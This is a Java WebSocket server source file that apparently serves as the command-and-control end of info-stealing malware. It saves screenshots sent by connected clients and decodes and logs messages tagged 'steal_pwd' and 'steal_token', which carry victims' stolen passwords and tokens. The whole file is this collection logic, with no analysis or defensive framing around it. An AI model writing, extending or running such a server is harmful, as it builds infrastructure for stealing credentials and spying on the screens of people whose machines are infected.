package me.soda.server;

import org.java_websocket.WebSocket;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.server.WebSocketServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetSocketAddress;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Base64;

public class Server extends WebSocketServer {

    public static final Logger LOGGER = LoggerFactory.getLogger(Server.class);

    private static int clientIndex = 0;

    public Server(int port) {
        super(new InetSocketAddress(port));
    }

    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    private static String[] doStringParse(String[] msgArr) throws IllegalArgumentException {
        if (msgArr.length < 2) throw new IllegalArgumentException();
        String[] msgArr_ = decodeBase64(msgArr[1]).split(" ");
        String[] strArr = new String[msgArr_.length - 1];
        for (int index = 0; index < strArr.length; index++) {
            strArr[index] = decodeBase64(msgArr_[index + 1]);
        }
        return strArr;
    }

    public void log(String string) {
        LOGGER.info("{}: {}", LocalTime.now().format(DateTimeFormatter.ofPattern("hh:mm:ss")), string);
    }

    @Override
    public void onOpen(WebSocket conn, ClientHandshake handshake) {
        conn.setAttachment(clientIndex);
        clientIndex++;
        int cIndex = conn.<Integer>getAttachment();
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("客户端连接: " + address + " ID: " + cIndex);
    }

    @Override
    public void onClose(WebSocket conn, int code, String reason, boolean remote) {
        int cIndex = conn.<Integer>getAttachment();
        log("客户端已断开: ID: " + cIndex);
    }

    @Override
    public void onMessage(WebSocket conn, String message) {
        int cIndex = conn.<Integer>getAttachment();
        String[] msgArr = message.split(" ");
        log("* 收到消息: " + msgArr[0] + " From ID " + cIndex);
        switch (msgArr[0]) {
            case "screenshot":
                try {
                    File filename = new File("screenshots", LocalTime.now().format(DateTimeFormatter.ofPattern("hh-mm-ss")) + ".png");
                    new File("screenshots").mkdir();
                    filename.createNewFile();
                    FileOutputStream file = new FileOutputStream(filename);
                    file.write(Base64.getDecoder().decode(msgArr[1]));
                    file.close();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            case "steal_pwd":
            case "steal_token":
                try {
                    log("消息: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            default:
                try {
                    log("消息: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
        }
    }

    @Override
    public void onError(WebSocket conn, Exception e) {
        e.printStackTrace();
    }

    @Override
    public void onStart() {
    }
}
